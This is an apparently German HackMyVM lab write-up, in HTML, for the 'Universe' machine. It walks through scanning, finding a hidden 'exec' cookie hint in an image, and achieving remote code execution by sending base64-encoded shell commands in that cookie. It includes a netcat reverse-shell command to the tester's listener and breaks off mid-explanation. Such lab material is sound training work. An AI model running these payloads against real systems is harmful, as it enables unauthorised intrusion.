@@ -1,0 +1,902 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Universe - HackMyVM - Hard - Vulnhub - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- KEIN <style>-Block hier -->
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Universe - HackMyVM - Hard - Vulnhub - Level: Hard - Bericht</h1> <!-- Titel angepasst -->
+        <div class="level-container">
+            <!-- Schwierigkeitsgrad-Überschrift und Kreis gemäß Template und CSS -->
+            <h2>Hard</h2> <!-- Nur der Text, Farbe sollte Rot sein (via CSS) -->
+            <div class="circle"> <!-- Keine zusätzlichen Klassen -->
+                <div class="segment segment-1"></div> <!-- Farbe sollte Rot sein (via CSS) -->
+                <div class="segment segment-2"></div> <!-- Farbe sollte Rot sein (via CSS) -->
+                <div class="segment segment-3"></div> <!-- Farbe sollte Rot sein (via CSS) -->
+                <div class="inner"></div> <!-- Hintergrundfarbe kommt aus CSS -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Hier die Liste der Tools als <div class="tool-item">Toolname</div> Elemente einfügen -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">strings</div>
+                <div class="tool-item">stegseek</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">base64</div>
+                <div class="tool-item">nc (Netcat)</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">which</div>
+                <div class="tool-item">socat</div>
+                <div class="tool-item">cp</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cd</div>
+                <!-- Hydra wurde nicht erfolgreich eingesetzt -->
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Hier die Links zum Inhaltsverzeichnis als <li><a href="#id-der-section">Abschnittsname</a></li> Elemente einfügen -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration-1212">Web Enumeration (Port 1212)</a></li>
+                <li><a href="#steganography-cookie-analysis">Steganography / Cookie Analysis</a></li>
+                <li><a href="#rce-via-cookie">RCE via Cookie</a></li>
+                <li><a href="#poc-rce-cookie">Proof of Concept (RCE via Cookie)</a></li>
+                <li><a href="#initial-access">Initial Access (as miwa)</a></li>
+                <li><a href="#internal-service-port-forwarding">Internal Service Discovery & Port Forwarding</a></li>
+                <li><a href="#lfi-internal-app">LFI on Internal Application</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <!-- Hier die Reconnaissance-Schritte einfügen, mit Kommentaren und Code-Blöcken -->
+            <p class="comment">Beginn der Aufklärung mit einem ARP-Scan zur Identifizierung von Hosts im lokalen Netzwerk.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.107	08:00:27:97:de:db	PCS Systemtechnik GmbH</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der Befehl `arp-scan -l` sendet ARP-Anfragen ins lokale Netzwerk und identifiziert erfolgreich einen Host mit der IP-Adresse 192.168.2.107. Die MAC-Adresse (08:00:27:97:de:db) und der Hersteller (PCS Systemtechnik GmbH) weisen auf eine VirtualBox VM hin.</p>
+            <p class="evaluation">**Bewertung:** Das Zielsystem wurde erfolgreich im Netzwerk lokalisiert. Der Hinweis auf VirtualBox liefert ersten Kontext.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Konzentriere weitere Scans und Enumerationsschritte auf die IP 192.168.2.107.
+            <br>**Empfehlung (Admin):** Netzwerk-Monitoring und Segmentierung können die Erkennung erschweren, sind aber Standardmaßnahmen.</p>
+
+            <p class="comment">Hinzufügen eines Eintrags zur lokalen `/etc/hosts`-Datei zur Vereinfachung der Ansprache des Ziels.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                    <pre>
+
+                192.168.2.107   universe.hmv</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Die lokale Hosts-Datei wird bearbeitet, um der IP 192.168.2.107 den Hostnamen `universe.hmv` zuzuweisen. Dies ermöglicht die Verwendung dieses Namens anstelle der IP-Adresse in nachfolgenden Befehlen.</p>
+            <p class="evaluation">**Bewertung:** Eine nützliche Maßnahme zur Verbesserung der Lesbarkeit und Handhabung während des Penetrationstests.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Verwende den definierten Hostnamen `universe.hmv` in weiteren Befehlen.
+            <br>**Empfehlung (Admin):** Keine serverseitigen Maßnahmen erforderlich, da dies eine lokale Konfiguration auf dem System des Testers ist.</p>
+
+             <p class="comment">Durchführung eines umfassenden Nmap-Scans über alle Ports mit Service-Version, OS-Erkennung und Standard-Skripten.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sV -A -T5 192.168.2.107 -p-</span></div>
+                    <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-27 23:43 CET
+Nmap scan report for universe (192.168.2.107)
+Host is up (0.00013s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.3
+22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
+| ssh-hostkey:
+|   256 95:d6:5d:68:a3:38:f7:74:87:b3:99:20:f8:be:45:4d (ECDSA)
+|_  256 11:77:31:ae:36:4e:22:45:9c:89:8f:5e:e6:01:83:0d (ED25519)
+1212/tcp open  lupa?
+| fingerprint-strings:
+|   GetRequest:
+|     HTTP/1.1 302 FOUND
+|     Server: Werkzeug/2.2.2 Python/3.11.2
+|     Date: Wed, 27 Mar 2024 22:43:28 GMT
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 207
+|     Location: /?user=742
+|     Connection: close
+|     <!doctype html>
+|     <html lang=en>
+|     <title>Redirecting...</title>
+|     <h1>Redirecting...</h1>
+|     <p>You should be redirected automatically to the target URL: <a href="/?user=742">/?user=742</a>. If not, click the link.
+|   HTTPOptions:
+|     HTTP/1.1 200 OK
+|     Server: Werkzeug/2.2.2 Python/3.11.2
+|     Date: Wed, 27 Mar 2024 22:43:28 GMT
+|     Content-Type: text/html; charset=utf-8
+|     Allow: OPTIONS, HEAD, GET
+|     Content-Length: 0
+|     Connection: close
+|   Help:
+|     <!DOCTYPE HTML>
+|     <html lang="en">
+|     <head>
+|     <meta charset="utf-8">
+|     <title>Error response</title>
+|     </head>
+|     <body>
+|     <h1>Error response</h1>
+|     <p>Error code: 400</p>
+|     <p>Message: Bad request syntax ('HELP').</p>
+|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
+|     </body>
+|     </html>
+|   RTSPRequest:
+|     <!DOCTYPE HTML>
+|     <html lang="en">
+|     <head>
+|     <meta charset="utf-8">
+|     <title>Error response</title>
+|     </head>
+|     <body>
+|     <h1>Error response</h1>
+|     <p>Error code: 400</p>
+|     <p>Message: Bad request version ('RTSP/1.0').</p>
+|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
+|     </body>
+|_    </html>
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port1212-TCP:V=7.94SVN%I=7%D=3/27%Time=6604A110%P=x86_64-pc-linux-gnu%r
+SF:(GetRequest,196,"HTTP/1\.1\x20302\x20FOUND\r\nServer:\x20Werkzeug/2\.2\
+SF:.2\x20Python/3\.11\.2\r\nDate:\x20Wed,\x2027\x20Mar\x202024\x2022:43:28
+SF:\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Leng
+SF:th:\x20207\r\nLocation:\x20/\?user=742\r\nConnection:\x20close\r\n\r\n<
+SF:!doctype\x20html>\n<html\x20lang=en>\n<title>Redirecting\.\.\.</title>\
+SF:n<h1>Redirecting\.\.\.</h1>\n<p>You\x20should\x20be\x20redirected\x20au
+SF:tomatically\x20to\x20the\x20target\x20URL:\x20<a\x20href=\"/\?user=742\
+SF:">/\?user=742</a>\.\x20If\x20not,\x20click\x20the\x20link\.\n")%r(HTTP
+SF:Options,C7,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.2\.2\x20Pyt
+SF:hon/3\.11\.2\r\nDate:\x20Wed,\x2027\x20Mar\x202024\x2022:43:28\x20GMT\r
+SF:\nContent-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20OPTIONS,\x2
+SF:0HEAD,\x20GET\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")
+SF:%r(RTSPRequest,16C,"<!DOCTYPE\x20HTML>\n<html\x20lang=\"en\">\n\x20\x20
+SF:\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=\"utf-
+SF:8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<title>Error\x20response</title>\
+SF:n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\
+SF:x20\x20\x20<h1>Error\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20
+SF:<p>Error\x20code:\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Messag
+SF:e:\x20Bad\x20request\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\
+SF:x20\x20\x20\x20\x20<p>Error\x20code\x20explanation:\x20400\x20-\x20Bad\
+SF:x20request\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x20
+SF:\x20</body>\n</html>\n")%r(Help,167,"<!DOCTYPE\x20HTML>\n<html\x20lang=
+SF:\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\
+SF:x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<title>Error\x20
+SF:response</title>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body>\n\x20
+SF:\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20response</h1>\n\x20\x20\x20\x2
+SF:0\x20\x20\x20\x20<p>Error\x20code:\x20400</p>\n\x20\x20\x20\x20\x20\x20
+SF:\x20\x20<p>Message:\x20Bad\x20request\x20syntax\x20\('HELP'\)\.</p>\n\x
+SF:20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code\x20explanation:\x20400\x
+SF:20-\x20Bad\x20request\x20syntax\x20or\x20unsupported\x20method\.</p>\n\
+SF:x20\x20\x20\x20</body>\n</html>\n");
+MAC Address: 08:00:27:97:DE:DB (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.13 ms universe (192.168.2.107)</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der Nmap-Scan (`-sS`, `-sV`, `-A`, `-T5`, `-p-`) identifiziert drei offene TCP-Ports:
+            <ul>
+                <li>**Port 21 (FTP):** vsftpd 3.0.3. Standard-FTP-Server.</li>
+                <li>**Port 22 (SSH):** OpenSSH 9.2p1 auf Debian. Standard-SSH-Server.</li>
+                <li>**Port 1212 (Unbekannt/lupa?):** Nmap kann den Dienst nicht eindeutig identifizieren, erhält aber HTTP-ähnliche Antworten. Die Fingerprints (`fingerprint-strings`) zeigen, dass GET-Requests einen HTTP/1.1 302 Redirect auf `/?user=742` auslösen. Der Server identifiziert sich als `Werkzeug/2.2.2 Python/3.11.2`, was auf eine mit Python (vermutlich Flask oder ein ähnliches Framework, das Werkzeug nutzt) entwickelte Webanwendung hindeutet. OPTIONS-Requests sind erlaubt. Ungültige Requests (HELP, RTSP) erzeugen HTTP 400 Fehler.</li>
+            </ul>
+            Die OS-Erkennung deutet auf Linux hin.</p>
+            <p class="evaluation">**Bewertung:** Hoch. Drei Dienste identifiziert. FTP und SSH sind Standard, erfordern aber Prüfung auf anonymen Zugriff/schwache Credentials. Port 1212 ist besonders interessant: Eine Python-Webanwendung, die auf einem Nicht-Standard-Port läuft und Redirects mit einem `user`-Parameter durchführt. Dies ist ein primäres Ziel für weitere Untersuchungen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):**
+            1. Prüfe FTP auf anonymen Login (`ftp universe.hmv`, User `anonymous`).
+            2. Versuche Standard-Credentials oder Brute-Force gegen SSH (z.B. Benutzer `root`, `admin`, `miwa`, `void` - aus späteren Logs).
+            3. Konzentriere dich auf Port 1212: Untersuche die Python-Webanwendung mit Nikto, Gobuster und manueller Analyse. Analysiere den `user`-Parameter im Redirect und die generelle Funktionsweise der Anwendung.
+            <br>**Empfehlung (Admin):**
+            1. Stelle sicher, dass FTP anonymen Zugriff verhindert und nur für benötigte Benutzer aktiviert ist.
+            2. Härte SSH (Keys, Fail2ban, kein Root-Login).
+            3. Untersuche die Notwendigkeit und Sicherheit der Python-Anwendung auf Port 1212. Warum läuft sie auf diesem Port? Ist Authentifizierung implementiert?</p>
+
+            <p class="comment">Gefilterte Nmap-Ausgabe zur Übersicht der offenen Ports.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sV -A -T5 192.168.2.107 -p- | grep open</span></div>
+                    <pre>
+21/tcp   open  ftp     vsftpd 3.0.3
+22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
+1212/tcp open  lupa?</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Die gefilterte Ausgabe zeigt die drei offenen Ports: 21 (FTP), 22 (SSH) und 1212 (Unbekannt/Python-Webapp).</p>
+            <p class="evaluation">**Bewertung:** Bietet eine schnelle Referenz der offenen Ports.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Untersuche alle drei Ports, beginnend mit dem ungewöhnlichsten (1212).
+            <br>**Empfehlung (Admin):** Überprüfe die Notwendigkeit und Konfiguration aller drei Dienste.</p>
+
+        </section>
+
+        <section id="web-enumeration-1212">
+            <h2>Web Enumeration (Port 1212)</h2>
+            <p class="comment">Durchführung eines Nikto-Scans gegen die Webanwendung auf Port 1212.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h 192.168.2.107:1212</span></div>
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.107
++ Target Hostname:    192.168.2.107
++ Target Port:        1212
++ Start Time:         2024-03-27 23:45:57 (GMT1)
+---------------------------------------------------------------------------
++ Server: Werkzeug/2.2.2 Python/3.11.2
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ Root page / redirects to: /?user=986
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ OPTIONS: Allowed HTTP Methods: OPTIONS, HEAD, GET .
++ /cfg/CFGConnectionParams.txt: Caremark Carestream config file found. May include account information and host data.
++ 8102 requests: 0 error(s) and 4 item(s) reported on remote host
++ End Time:           2024-03-27 23:46:18 (GMT1) (21 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Nikto scannt die Python-Anwendung auf Port 1212:
+            <ul>
+                <li>Bestätigt Server: `Werkzeug/2.2.2 Python/3.11.2`.</li>
+                <li>Meldet fehlende Security Header (`X-Frame-Options`, `X-Content-Type-Options`).</li>
+                <li>Bestätigt den Redirect von `/` auf `/?user=[ID]` (hier `user=986`).</li>
+                <li>Findet eine potenziell interessante Datei: `/cfg/CFGConnectionParams.txt` (als Carestream-Konfigurationsdatei identifiziert).</li>
+            </ul></p>
+            <p class="evaluation">**Bewertung:** Mittel bis Hoch. Fehlende Header sind weniger kritisch. Der Redirect mit `user`-Parameter ist sehr interessant. Die gefundene Konfigurationsdatei `/cfg/CFGConnectionParams.txt` ist ein potenziell sehr wichtiger Fund, falls sie zugänglich ist und sensible Daten enthält.</p>
+            <p class="recommendation">**Empfehlung (Pentester):**
+            1. Versuche, die Datei `/cfg/CFGConnectionParams.txt` direkt abzurufen (`curl http://universe.hmv:1212/cfg/CFGConnectionParams.txt`).
+            2. Untersuche den `user`-Parameter im Redirect. Kann er manipuliert werden? Gibt es IDOR?
+            3. Führe weitere Verzeichnis-Scans (Gobuster etc.) durch.
+            <br>**Empfehlung (Admin):**
+            1. Implementiere die fehlenden Security Header.
+            2. Stelle sicher, dass Konfigurationsdateien nicht über den Webserver zugänglich sind.
+            3. Überprüfe die Logik des `user`-Parameters auf Sicherheitsprobleme.</p>
+
+             <p class="comment">Manuelle Untersuchung der Webanwendung und Analyse des Hintergrundbildes.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Befehl, sondern Beschreibung der Browser-Interaktion -->
+                    <pre>
+http://192.168.2.107:1212/?user=887
+Server Werkzeug/2.2.2 Python/3.11.2</pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Befehl, sondern Auszug aus HTML/CSS -->
+                    <pre>     background: url('static/universe.jpg</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wget http://192.168.2.107:1212/static/universe.jpg</span></div>
+                     <pre>
+--2024-03-28 00:03:11--  http://192.168.2.107:1212/static/universe.jpg
+Verbindungsaufbau zu 192.168.2.107:1212 … verbunden.
+HTTP-Anforderung gesendet, auf Antwort wird gewartet … 200 OK
+Länge: 218175 (213K) [image/jpeg]
+Wird in universe.jpg gespeichert.
+
+universe.jpg            100%[======================================>] 213,06K  --.-KB/s    in 0s
+
+2024-03-28 00:03:11 (427 MB/s) - universe.jpg gespeichert [218175/218175]</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:**
+            1. Durch manuelles Browsen wird bestätigt, dass die Anwendung auf Anfragen wie `/?user=887` reagiert.
+            2. Im Quellcode (oder CSS) wird entdeckt, dass die Datei `/static/universe.jpg` als Hintergrundbild verwendet wird.
+            3. Die Bilddatei wird mit `wget` erfolgreich heruntergeladen.</p>
+            <p class="evaluation">**Bewertung:** Standard-Enumeration. Das Herunterladen des Bildes ist wichtig, da Bilder oft für Steganographie verwendet werden.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Analysiere die heruntergeladene Datei `universe.jpg` mit Steganographie-Tools (`strings`, `exiftool`, `steghide`, `stegseek`).
+            <br>**Empfehlung (Admin):** Keine direkten Maßnahmen erforderlich.</p>
+        </section>
+
+        <section id="steganography-cookie-analysis">
+             <h2>Steganography / Cookie Analysis</h2>
+            <p class="comment">Analyse der heruntergeladenen Bilddatei mit `strings` und `stegseek`.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">strings universe.jpg -n 8</span></div>
+                     <pre>
++@)5Ib0Z
+... <!-- Ausgabe gekürzt, aber relevanter String fehlt hier -->
+'Cookie exec: aWQ='</pre> <!-- Wichtiger String gefunden! -->
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stegseek universe.jpg /usr/share/wordlists/rockyou.txt</span></div>
+                     <pre>
+StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+
+[i] Progress: 99.36% (132.6 MB)
+[!] error: Could not find a valid passphrase.</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:**
+            1. `strings universe.jpg -n 8`: Sucht nach Zeichenketten mit mindestens 8 Zeichen Länge im Bild. Die Ausgabe ist im Log unvollständig, enthält aber die entscheidende Zeile `'Cookie exec: aWQ='`. Dies ist ein starker Hinweis auf eine versteckte Information, die einen Cookie namens `exec` mit dem Base64-kodierten Wert `aWQ=` betrifft.
+            2. `stegseek universe.jpg ...`: Versucht, versteckte Daten mittels Passphrasen aus `rockyou.txt` zu extrahieren. Dieser Versuch schlägt fehl.</p>
+            <p class="evaluation">**Bewertung:** Hoch. Der `strings`-Befehl hat einen kritischen Hinweis auf einen `exec`-Cookie mit einem Base64-Wert geliefert. `stegseek` war erfolglos, aber der Hinweis aus `strings` ist ausreichend.</p>
+            <p class="recommendation">**Empfehlung (Pentester):**
+            1. Dekodiere den Base64-Wert `aWQ=`.
+            2. Untersuche die Webanwendung auf Port 1212 erneut, diesmal indem du den Cookie `exec` mit dem dekodierten Wert (oder anderen Base64-kodierten Werten) sendest.
+            <br>**Empfehlung (Admin):** Untersuche, warum sensible Informationen (Cookie-Name und Wert) in einer Bilddatei versteckt sind. Entferne die versteckten Daten.</p>
+        </section>
+
+        <section id="rce-via-cookie">
+            <h2>RCE via Cookie</h2>
+            <p class="comment">Untersuchung der Auswirkung des gefundenen `exec`-Cookies.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Befehl, sondern Beschreibung -->
+                    <pre>
+http://192.168.2.107:1212/?user=9
+
+Universe Console
+The infinity of the universe reflected in your eyes...
+
+Result: Missing 'exec' cookie</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Beim Aufruf der Anwendung (hier mit `user=9`) ohne den `exec`-Cookie erscheint die Meldung "Result: Missing 'exec' cookie". Dies bestätigt, dass die Anwendung diesen Cookie erwartet.</p>
+            <p class="evaluation">**Bewertung:** Bestätigt die Relevanz des im Bild gefundenen Cookies.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Sende den Cookie mit dem dekodierten Wert mit.
+            <br>**Empfehlung (Admin):** Keine Maßnahmen erforderlich.</p>
+
+            <p class="comment">Dekodieren des Base64-Wertes und Testen des Cookies mit dem dekodierten Wert.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">echo "aWQ=" | base64 -d</span></div>
+                     <pre>id</pre>
+                 </div>
+             </div>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl "http://192.168.2.107:1212/?user=9" -H 'Cookie: exec=aWQ='</span></div>
+                     <pre>
+
+    <h1>Universe Console</h1>
+    <h4>The infinity of the universe reflected in your eyes... </h4>
+    <p>Result: uid=1000(miwa) gid=1000(miwa) groups=1000(miwa)
+</p>
+</body>
+</html></pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:**
+            1. Der Base64-Wert `aWQ=` wird dekodiert und ergibt den String `id`.
+            2. Eine `curl`-Anfrage an `/?user=9` wird gesendet, diesmal mit dem Header `Cookie: exec=aWQ=`.
+            3. Die Antwort enthält nun im "Result"-Bereich die Ausgabe des `id`-Befehls (`uid=1000(miwa)...`). Dies beweist, dass der Wert des `exec`-Cookies Base64-dekodiert und dann als Shell-Befehl ausgeführt wird.</p>
+            <p class="evaluation">**Bewertung:** Kritisch! Eine Remote Code Execution (RCE)-Schwachstelle wurde identifiziert. Der Angreifer kann beliebige Befehle als Benutzer `miwa` ausführen, indem er sie Base64-kodiert und als Wert des `exec`-Cookies sendet.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Nutze diese RCE, um eine Reverse Shell zu erhalten. Kodiere den Reverse-Shell-Befehl in Base64 und sende ihn im `exec`-Cookie.
+            <br>**Empfehlung (Admin):** **Dringend:** Entferne diese RCE-Schwachstelle sofort. Benutzereingaben (insbesondere aus Cookies) dürfen niemals direkt oder nach einfacher Dekodierung als Shell-Befehle ausgeführt werden. Verwende sichere Methoden zur Interaktion mit dem System und validiere alle Eingaben strikt.</p>
+
+            <p class="comment">Testen weiterer Befehle über den `exec`-Cookie.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">echo "ls" | base64</span></div>
+                     <pre>bHMK</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl "http://192.168.2.107:1212/?user=9" -H 'Cookie: exec=bHMK'</span></div>
+                     <pre>
+
+    <h1>Universe Console</h1>
+    <h4>The infinity of the universe reflected in your eyes... </h4>
+    <p>Result: app.py
+</p>
+</body>
+</html></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">echo "ls /home" | base64</span></div>
+                     <pre>bHMgL2hvbWUK</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl "http://192.168.2.107:1212/?user=9" -H 'Cookie: exec=bHMgL2hvbWUK'</span></div>
+                     <pre>
+
+    <h1>Universe Console</h1>
+    <h4>The infinity of the universe reflected in your eyes... </h4>
+    <p>Result: miwa
+</p>
+</body>
+</html></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">echo "ls /home/miwa" | base64</span></div>
+                     <pre>bHMgL2hvbWUvbWl3YQo=</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl "http://192.168.2.107:1212/?user=9" -H 'Cookie: exec=bHMgL2hvbWUvbWl3YQo='</span></div>
+                     <pre>
+
+    <h1>Universe Console</h1>
+    <h4>The infinity of the universe reflected in your eyes... </h4>
+    <p>Result: web
+</p>
+</body>
+</html></pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Verschiedene `ls`-Befehle werden Base64-kodiert und über den `exec`-Cookie gesendet:
+            <ul>
+                <li>`ls` -> `bHMK`: Zeigt die Datei `app.py` im aktuellen Verzeichnis (vermutlich das Verzeichnis der Webanwendung).</li>
+                <li>`ls /home` -> `bHMgL2hvbWUK`: Zeigt den Benutzer `miwa` im Home-Verzeichnis an.</li>
+                <li>`ls /home/miwa` -> `bHMgL2hvbWUvbWl3YQo=`: Zeigt ein Unterverzeichnis `web` im Home-Verzeichnis von `miwa`.</li>
+            </ul>
+            Dies bestätigt die RCE und liefert erste Informationen über die Dateistruktur.</p>
+            <p class="evaluation">**Bewertung:** Erfolgreiche Nutzung der RCE zur Enumeration.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Etabliere eine Reverse Shell für eine komfortablere Interaktion.
+            <br>**Empfehlung (Admin):** Behebe die RCE-Schwachstelle.</p>
+
+            <p class="comment">Fehlgeschlagener Versuch, eine Netcat-Reverse-Shell zu starten.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">echo "nc -e /bin/bash 192.168.2.199 4444" | base64</span></div>
+                     <pre>bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMi4xOTkgNDQ0NAo=</pre> <!-- Fehler im Log: 199 statt 107 -->
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                     <pre>listening on [any] 4444 ...</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl "http://192.168.2.107:1212/?user=9" -H 'Cookie: exec=bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMi4xOTkgNDQ0NAo='</span></div> <!-- Fehler im Log: 199 statt 107 -->
+                     <pre>
+
+    <h1>Universe Console</h1>
+    <h4>The infinity of the universe reflected in your eyes... </h4>
+    <p>Result: Invalid cookie value</p>
+</body>
+</html></pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Es wird versucht, eine Netcat-Reverse-Shell (`nc -e ...`) zu starten. Der Befehl wird Base64-kodiert (`bmMg...`) und im `exec`-Cookie gesendet. Der Server antwortet jedoch mit "Result: Invalid cookie value". Mögliche Gründe:
+            <ul>
+                <li>Die Netcat-Version auf dem Ziel unterstützt `-e` nicht.</li>
+                <li>Der Befehl enthält Zeichen, die nach der Base64-Dekodierung Probleme verursachen oder gefiltert werden.</li>
